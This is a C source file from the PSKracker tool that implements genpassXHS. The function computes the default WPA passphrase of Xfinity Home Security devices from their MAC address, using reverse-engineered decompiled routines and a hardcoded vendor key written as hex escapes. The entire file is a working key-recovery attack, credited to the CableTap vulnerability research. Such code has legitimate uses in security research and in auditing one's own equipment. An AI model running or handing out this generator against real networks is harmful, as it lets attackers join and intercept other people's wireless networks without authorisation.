/*
 * PSKracker: WPA/WPA2/WPS default key/pin generator written in C.
 *
 * Copyright (c) 2017-2019, soxrok2212 <soxrok2212@gmail.com>
 * SPDX-License-Identifier: GPL-3.0+
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

/*
 * Credits for discovering the vulnerability to:
 * Marc Newlin @marcnewlin, Logan Lamb, and Christopher Grayson @_lavalamp and CableTap.
 * Thank you AAnarchYY for R&D
 * Thank you Wiire for the code
 */

#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "pskracker.h"

static unsigned int sub_AQW4(unsigned int result) {
    if (result) {
        int v4 = __builtin_clz(result) - 8;
        int v5 = (result | 0x4B000000) - 0x800000 - (v4 << 23);
        result = v5 + (result << v4);
    }
    return result;
}

static unsigned int sub_AQf4(unsigned int a1, unsigned int a2) {
    const unsigned int v10 = ((a2 << 9) >> 4) | 0x10000000;
    unsigned int v11 = ((a1 << 9) >> 4) | 0x10000000;
    unsigned int v12 = (a1 ^ a2) & 0x80000000;
    unsigned int v14 = (v11 >= v10) + ((a1 >> 23) & 0xFF) - ((a2 >> 23) & 0xFF) + 0x7D;
    unsigned int v15 = 0x800000;
    unsigned int v16;
    unsigned int result;
    if (v11 < v10)
        v11 *= 2;
        do {
            if (v11 >= v10)      { v11 -= v10;      v12 |= v15;      }
            if (v11 >= v10 >> 1) { v11 -= v10 >> 1; v12 |= v15 >> 1; }
            if (v11 >= v10 >> 2) { v11 -= v10 >> 2; v12 |= v15 >> 2; }
            if (v11 >= v10 >> 3) { v11 -= v10 >> 3; v12 |= v15 >> 3; }
            v11 *= 16;
            v16 = (v11 == 0);
            if (v11) {
                v15 >>= 4;
                v16 = (v15 == 0);
            }
        } while (!v16);
        if (v14 > 0xFD)
        return (v12 & 0x80000000) | 0x7F800000;
        result = (v14 << 23) + (v11 >= v10) + v12;
        if (v11 == v10)
            result &= 0xFFFFFFFE;
        return result;
}

static unsigned int sub_AQlY(int a1) {
    unsigned int result;
    int v3 = 0x9E - (a1 >> 23);
    if (v3 != 0 && a1 >> 23 <= 0x9E) {
        result = ((a1 << 8) | 0x80000000) >> v3;
        if (a1 & 0x80000000)
            result = -result;
    }
    else if (v3 == -('a') && a1 << 9) {
        result = 0;
    }
    else {
        if (!(a1 & 0x80000000))
        result = 0x7FFFFFFF;
    }
    return result;
}

static uint8_t meld_integers(int16_t a1, int16_t a2) {
    int result = ((a2 ^ a1) - (a1 & a2)) >> 2;
    while (result > 'z') {
        unsigned int v3 = sub_AQW4(result);
        unsigned int v6 = sub_AQf4(v3, 0x3FCCCCCD);
        result = sub_AQlY(v6) & 0xFFFF;
    }
    while (result < '0')
        result += 13;
    if ((unsigned int)(result - '9' - 1) <= 6)
        result += 7;
    if ((unsigned int)(result - 'Z' - 1) <= 5)
        result = result - 11;
    return (uint8_t)result;
}

static int swizzle_mac_array(uint16_t *mac) {
    int result;
    int16_t v2 = mac[4];
    int16_t v3 = mac[5];
    int16_t v4 = mac[3];
    int16_t v5 = (v4 - (v3 << 3) * (v2 << 1)) ^ mac[0];
    mac[0] = v5;
    uint16_t v6 = mac[1] - ((v3 << 2) ^ (v5 << 3));
    int16_t v7 = mac[2] | ((v3 << 1) - v4);
    mac[1] = v6;
    result = v6 << 3;
    mac[2] = v7;
    mac[3] = v4 * (v2 + (v5 << 1));
    mac[4] = v2 ^ (result - v7);
    return result;
}

char *genpassXHS(uint8_t *mac) {
	#define XHS_PSK_LEN 18
	const char *PRIV_KEY_CHARS = "\x53\x45\x6a\x44\x7a\x4d\x71\x41\x6a"
	                             "\x52\x6e\x55\x46\x62\x74\x49\x53\x46";
    unsigned int i, vendorLen;
    uint16_t mac16[BSSID_LEN];
    char *psk = malloc(XHS_PSK_LEN + 1);
    if (!psk)
        return psk;
    for (i = 0; i < BSSID_LEN; i++)
        mac16[i] = mac[i];
    swizzle_mac_array(mac16);
    vendorLen = strlen(PRIV_KEY_CHARS);
    for (i = 0; i != XHS_PSK_LEN; i++) {
        int16_t tmp = meld_integers(mac16[i % BSSID_LEN], PRIV_KEY_CHARS[i]);
        if (vendorLen > i) {
            psk[i] = meld_integers(PRIV_KEY_CHARS[i], tmp);
        }
        else {
            psk[i] = tmp;
        }
    }
psk[XHS_PSK_LEN] = '\0';
return psk;
}
